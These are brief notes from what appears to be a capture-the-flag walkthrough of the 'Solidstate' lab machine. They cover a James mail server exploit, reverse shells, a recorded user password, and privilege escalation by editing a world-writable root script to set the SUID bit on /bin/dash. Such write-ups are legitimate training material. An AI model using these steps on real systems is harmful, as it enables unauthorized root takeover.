## Solidstate

https://www.exploit-db.com/exploits/46676

apache 2.4.25

james mail server exploit

use pentest monkey reverse shells


privesc

mindy pass P@55W0rd1!2@

linEnum -t

[-] Files not owned by user but writable by group:
-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py

to edit the file ^Z to background the shell.

now `stty raw -echo`

find suid files `find / -perm -u=s -type f 2>/dev/null`

os.system('chmod 4755 /bin/dash')
